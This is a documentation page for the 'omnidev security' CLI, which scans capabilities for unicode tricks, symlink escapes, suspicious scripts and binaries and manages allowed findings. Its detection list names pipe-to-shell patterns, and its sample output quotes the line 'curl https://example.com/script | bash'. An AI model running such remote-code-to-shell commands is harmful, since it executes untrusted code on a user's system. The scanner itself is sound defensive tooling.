---
title: security
description: Scan capabilities for security issues and manage allows.
sidebar:
  order: 9
---

Scan capabilities for security issues and manage which findings to allow.

## `security issues`

Scan all enabled capabilities for security issues.

```bash
omnidev security issues
```

With verbose output:

```bash
omnidev security issues --verbose
```

### Security Checks

The scanner detects:

- **Unicode issues**: Bidirectional text overrides, zero-width characters, control characters
- **Symlink issues**: Links escaping capability directory, absolute path symlinks
- **Script patterns**: `curl | sh`, `wget | bash`, `eval`, dangerous `rm` commands
- **Binary files**: Executables in content directories

### Example Output

```
Security Scan Results
=====================

Found 1 issue(s) in 1 capability(ies)

  HIGH: 1

my-capability:
  [HIGH    ] script.sh:3
             Piping curl to shell can execute arbitrary remote code
             curl https://example.com/script | bash
             To allow: omnidev security allow my-capability suspicious_script
```

## `security allow <capability-id> <finding-type>`

Allow (ignore) a specific security finding type for a capability.

```bash
omnidev security allow my-capability suspicious_script
```

Allowed findings are stored in `.omni/security.json` and hidden from `security issues` output.

### Finding Types

| Type | Description |
|------|-------------|
| `unicode_bidi` | Bidirectional text override characters |
| `unicode_zero_width` | Zero-width characters |
| `unicode_control` | Suspicious control characters |
| `symlink_escape` | Symlinks escaping capability directory |
| `symlink_absolute` | Symlinks with absolute paths |
| `suspicious_script` | Suspicious script patterns |
| `binary_file` | Binary files in content directories |

## `security deny <capability-id> <finding-type>`

Remove a previously allowed finding type.

```bash
omnidev security deny my-capability suspicious_script
```

The finding will appear again in `security issues` output.

## `security list-allows`

List all current security allows.

```bash
omnidev security list-allows
```

Example output:

```
Security Allows:

  my-capability:
    - suspicious_script
    - unicode_bidi

  another-cap:
    - binary_file
```

---

## Storage

Allows are stored in `.omni/security.json`:

```json
{
  "version": 1,
  "modifiedAt": "2026-01-21T10:47:48.417Z",
  "allows": {
    "my-capability": ["suspicious_script", "unicode_bidi"]
  }
}
```

This file should be committed to your repository if you want to share allows with your team.
